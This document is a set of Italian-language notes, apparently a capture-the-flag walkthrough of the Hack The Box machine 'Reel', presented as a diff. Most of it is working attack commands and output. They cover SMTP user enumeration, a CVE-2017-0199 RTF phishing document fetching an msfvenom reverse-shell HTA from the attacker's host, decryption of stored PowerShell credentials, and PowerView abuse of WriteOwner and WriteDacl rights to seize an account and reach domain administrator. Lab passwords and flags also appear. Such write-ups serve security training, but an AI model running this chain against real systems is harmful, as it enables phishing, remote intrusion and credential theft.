@@ -1,0 +1,443 @@
+10.10.10.77
+
+
+masscan -p1-65535 --rate 1000 --banners --open -e tun0 10.10.10.77
+
+
+Discovered open port 22/tcp on 10.10.10.77
+Discovered open port 25/tcp on 10.10.10.77
+Discovered open port 21/tcp on 10.10.10.77
+
+
+nmap -sC -sV -Pn -p22,25,21 10.10.10.77
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_05-28-18  11:19PM       <DIR>          documents
+| ftp-syst:
+|_  SYST: Windows_NT
+22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)
+| ssh-hostkey:
+|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
+|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
+|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
+25/tcp open  smtp?
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:
+|     220 Mail Service ready
+|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
+|     220 Mail Service ready
+|     sequence of commands
+|     sequence of commands
+|   Hello:
+|     220 Mail Service ready
+|     EHLO Invalid domain address.
+|   Help:
+|     220 Mail Service ready
+|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+|   SIPOptions:
+|     220 Mail Service ready
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|   TerminalServerCookie:
+|     220 Mail Service ready
+|_    sequence of commands
+| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP,
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+
+
+inizio con ftp (port 21)
+
+Name (10.10.10.77:daerves): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+
+
+ci trovo i tre files nella directory ftp_files
+readme.txt:
+      please email me any rtf format procedures - I'll review and convert.
+
+      new format / converted documents will be saved here.
+
+AppLocker.docx
+      AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
+
+Windows Event Forwarding.docx
+      è corrotto, non me lo fa aprire con libreoffice
+      mentre passandolo su windows me lo f aprire e riesce a recuperare il contenuto
+      copiato in WIndowsEventForward.txt
+
+
+http://WEF.HTB.LOCAL:5985/wsman/SubscriptionManager/WEC,Refresh=60
+
+tra le persone correlate al documento mi esce nico@megabank.com
+
+potrei sfruttarlo o per entrare con ssh nel caso in cui trovo una pwd oppure per inviare una mail a suo nome sfruttando smtp
+
+in particolare potrei creare un file rtf con macro per rev shell ecc sperando che il file venga aperto (automaticamente)
+e quindi venga eseguita la macro, in pratica devo realizzare un attacco di phishing anche se non so ancora a chi mandare la mail
+probabilmente devo inviarla a nico@megabank.com oppure posso provare ad enumerare gli usernames in smtp
+
+smtp-user-enum -M RCPT -u nico@megabank.com -t 10.10.10.77
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Target count ............. 1
+Username count ........... 1
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............
+
+######## Scan started at Thu Dec  9 08:12:28 2021 #########
+10.10.10.77: nico@megabank.com exists
+######## Scan completed at Thu Dec  9 08:12:28 2021 #########
+1 results.
+
+1 queries in 1 seconds (1.0 queries / sec)
+
+facendo qualche prova vedo che accetta qualunque utente con @reel.com e @reel.htb, ma non tutti con @megabank.com
+
+
+
+per generare il file rtf che sfrtta la vulnerabilità si può usare: https://www.exploit-db.com/exploits/41894 (CVE-2017-0199)
+
+dovrebbe ssere anche integrato in metasploit
+
+per evitare di usare metasploit posso usare questo toolkit
+
+https://github.com/bhdresh/CVE-2017-0199
+
+per prima cosa genero rev shell sottoforma di .hta:
+      msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=443 -f hta-psh -o revShell.hta
+poi start il server python che permette di scaricarla quando richiesta dal documento rtf
+      python3 -m http.server 80
+genero il documento rtf usando lo script:
+      python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://10.10.16.5/revShell.hta
+start listener per rev shell:
+      nc -lvnp 443
+mando la mail, visto che non so precisamente a chi mandarla la mando a nico@megabank.com, come mittente potrei mettere qualunque account con @reel.htb visto che li riconosce tutti il server smtp
+      sendemail -f daerves@reel.htb -s 10.10.10.77 -t nico@megabank.com -a Invoice.rtf  -m "please review"
+
+
+C:\Windows\system32>whoami
+whoami
+htb\nico
+
+C:\Windows\system32>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+nessun privilege da notare
+
+C:\Users\nico\Desktop>type user.txt
+type user.txt
+fa363aebcfa2c29897a69af385fee971
+
+
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is CC8A-33E1
+
+ Directory of C:\Users
+
+03/11/2017  23:09    <DIR>          .
+03/11/2017  23:09    <DIR>          ..
+25/10/2017  20:48    <DIR>          .NET v2.0
+25/10/2017  20:48    <DIR>          .NET v2.0 Classic
+01/11/2017  21:58    <DIR>          .NET v4.5
+01/11/2017  21:58    <DIR>          .NET v4.5 Classic
+16/02/2018  23:29    <DIR>          Administrator
+04/11/2017  23:05    <DIR>          brad
+30/10/2017  23:00    <DIR>          claire
+25/10/2017  20:48    <DIR>          Classic .NET AppPool
+03/11/2017  23:09    <DIR>          herman
+31/10/2017  22:27    <DIR>          julia
+29/05/2018  22:37    <DIR>          nico
+22/08/2013  15:39    <DIR>          Public
+28/10/2017  21:32    <DIR>          SSHD
+16/11/2017  22:35    <DIR>          tom
+
+
+C:\Users\nico\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is CC8A-33E1
+
+ Directory of C:\Users\nico\Desktop
+
+28/05/2018  20:07    <DIR>          .
+28/05/2018  20:07    <DIR>          ..
+27/10/2017  23:59             1,468 cred.xml
+27/10/2017  23:40                32 user.txt
+               2 File(s)          1,500 bytes
+               2 Dir(s)  15,769,993,216 bytes free
+
+
+cred.xml:
+
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">HTB\Tom</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
+    </Props>
+  </Obj>
+</Objs>
+
+
+sembrano delle credenziali powershell esportate tramite Export-Clixml, possono essere importate aprendo powershell (powerhshell.exe) e poi usando:
+
+Import-CliXml -Path .\cred.xml
+
+quando faccio questo comando si blocca la shell
+
+quindi provo a usare powershell per eseguire solo una serie di comandi stampando il valore della variabile cred:
+
+C:\Users\nico\Desktop>powershell -Command "$cred=Import-CliXml -Path .\cred.xml; echo $cred"
+powershell -Command "$cred=Import-CliXml -Path .\cred.xml; echo $cred"
+
+UserName                                                                                                       Password
+--------                                                                                                       --------
+HTB\Tom                                                                                    System.Security.SecureString
+
+comincio ad avere qualche risultato, devo provare se riesco a stampare la SecureString
+
+C:\Users\nico\Desktop>powershell -Command "$cred=Import-CliXml -Path .\cred.xml; $cred.GetNetworkCredential() | Format-List *"
+powershell -Command "$cred=Import-CliXml -Path .\cred.xml; $cred.GetNetworkCredential() | Format-List *"
+
+
+UserName       : Tom
+Password       : 1ts-mag1c!!!
+SecurePassword : System.Security.SecureString
+Domain         : HTB
+
+ho ottenuto le credenziali per Tom:1ts-mag1c!!!
+
+posso provare a startare powershell come quell'utente:
+
+Start-Process powershell.exe -Credential $Credential -Verb RunAs
+
+oppure visto che la porta ssh 22 è disponibile posso provare ad accedere con ssh, riesco ad accedere:
+
+tom@REEL C:\Users\tom>whoami
+htb\tom
+
+
+tom@REEL C:\Users\tom\Desktop\AD Audit>dir
+ Volume in drive C has no label.
+ Volume Serial Number is CC8A-33E1
+
+ Directory of C:\Users\tom\Desktop\AD Audit
+
+05/29/2018  08:02 PM    <DIR>          .
+05/29/2018  08:02 PM    <DIR>          ..
+05/29/2018  11:44 PM    <DIR>          BloodHound
+05/29/2018  08:02 PM               182 note.txt
+               1 File(s)            182 bytes
+               3 Dir(s)  15,765,356,544 bytes free
+
+tom@REEL C:\Users\tom\Desktop\AD Audit>type note.txt
+Findings:
+
+Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).
+
+Maybe we should re-run Cypher query against other groups we've created.
+
+
+tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>.\SharpHound.exe -all
+This program is blocked by group policy. For more information, contact your system administrator.
+
+tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes
+
+========================================== ================ ============================================== =====================
+=============================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enab
+led by default, Enabled group
+BUILTIN\Print Operators                    Alias            S-1-5-32-550                                   Mandatory group, Enab
+led by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enab
+led by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enab
+led by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enab
+led by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enab
+led by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enab
+led by default, Enabled group
+HTB\SharePoint_Admins                      Group            S-1-5-21-2648318136-3688571242-2924127574-1142 Mandatory group, Enab
+led by default, Enabled group
+HTB\MegaBank_Users                         Group            S-1-5-21-2648318136-3688571242-2924127574-1604 Mandatory group, Enab
+led by default, Enabled group
+HTB\DR_Site                                Group            S-1-5-21-2648318136-3688571242-2924127574-1143 Mandatory group, Enab
+led by default, Enabled group
+HTB\HelpDesk_Admins                        Group            S-1-5-21-2648318136-3688571242-2924127574-1145 Mandatory group, Enab
+led by default, Enabled group
+HTB\Restrictions                           Group            S-1-5-21-2648318136-3688571242-2924127574-1146 Mandatory group, Enab
+led by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enab
+led by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+
+tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>copy acls.csv \\10.10.16.5\share
+
+
+importo il file acls.csv in BloodHound e ci sono due cose:
+  1) Tom ha permit  WriteOwner su user claire
+  2) Claire ha WriteDacl sul gruppo Backup Admins
+
+
+si potrebbe fare in modo di passare a claire, da claire aggiungere l'utente stesso al gruppo Backup Admins, a questo punto sperare che backup Admins abbia il permsso di backup (come in blackfield)
+
+per prima cosa devo passare a claire
+
+ Active Directory objects such as users and groups are securable objects and DACL/ACEs define who can read/modify those objects (i.e change account name, reset password, etc). The WriteOwner permission can be abused by an attacker to change the object owner to an attacker controlled user and take over the object
+
+
+ per prendere controllo di Claire posso usare powerview (che già è sulla macchina quindi si può usare facilmente):
+
+      powershell
+      Import-Module .\PowerView.ps1
+
+      Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                     //set tom come owner di claire
+      Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword     //dai a tom permessi per cambiare la pwd di claire
+
+      $credentials = ConvertTo-SecureString "password123!" -AsPlainText -force
+      Set-DomainUserPassword -identity claire -accountpassword $credentials
+
+
+  in teoria ora dovrei riuscire ad accedere come claire con ssh usando la nuova pwd:
+
+  claire@REEL C:\Users\claire>whoami
+  htb\claire
+
+dall'analisi di prima claire ha WriteDacl sul gruppo Backup Admins (di cui non fa parte):
+
+claire@REEL C:\Users\claire>whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+
+=========================================== ================ ============================================== ====================
+==============================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Ena
+bled by default, Enabled group
+BUILTIN\Hyper-V Administrators              Alias            S-1-5-32-578                                   Mandatory group, Ena
+bled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Ena
+bled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Ena
+bled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Ena
+bled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Ena
+bled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Ena
+bled by default, Enabled group
+HTB\MegaBank_Users                          Group            S-1-5-21-2648318136-3688571242-2924127574-1604 Mandatory group, Ena
+bled by default, Enabled group
+HTB\DR_Site                                 Group            S-1-5-21-2648318136-3688571242-2924127574-1143 Mandatory group, Ena
+bled by default, Enabled group
+HTB\Restrictions                            Group            S-1-5-21-2648318136-3688571242-2924127574-1146 Mandatory group, Ena
+bled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Ena
+bled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+  WriteDacl grants the ability to modify the DACL in the object security descriptor Abusable with PowerView: Add-DomainObjectAcl
+
+  posso usarlo per aggiungere claire al gruppo dei Backup Admins
+  però non ho piu accesso a powerview quindi uso powershell normale:;
+
+  Add-ADGroupMember -Identity Backup_Admins -Members claire
+
+
+  PS C:\Users\claire> net group backup_admins
+Group name     Backup_Admins
+Comment
+
+Members
+
+-------------------------------------------------------------------------------
+claire                   ranj
+
+
+ora riesco ad accedere alla directory Administrator:
+
+claire@REEL C:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is CC8A-33E1
+
+ Directory of C:\Users\Administrator\Desktop
+
+01/21/2018  02:56 PM    <DIR>          .
+01/21/2018  02:56 PM    <DIR>          ..
+11/02/2017  09:47 PM    <DIR>          Backup Scripts
+10/28/2017  11:56 AM                32 root.txt
+
+ ma non ancora a root.txt, dentro al directory Administrator però c'è una dir Backup Scripts:
+
+ 11/02/2017  09:47 PM    <DIR>          .
+11/02/2017  09:47 PM    <DIR>          ..
+11/03/2017  11:22 PM               845 backup.ps1
+11/02/2017  09:37 PM               462 backup1.ps1
+11/03/2017  11:21 PM             5,642 BackupScript.ps1
+11/02/2017  09:43 PM             2,791 BackupScript.zip
+11/03/2017  11:22 PM             1,855 folders-system-state.txt
+11/03/2017  11:22 PM               308 test2.ps1.txt
+
+
+controllando gli scripts, in backupScript.ps1 c'è:
+
+# admin password
+$password="Cr4ckMeIfYouC4n!"
+
+ora posso accedere con ssh come administrator:
+
+
+administrator@REEL C:\Users\Administrator>whoami
+htb\administrator
+
+administrator@REEL C:\Users\Administrator\Desktop>type root.txt
+1018a0331e686176ff4577c728eaf32a
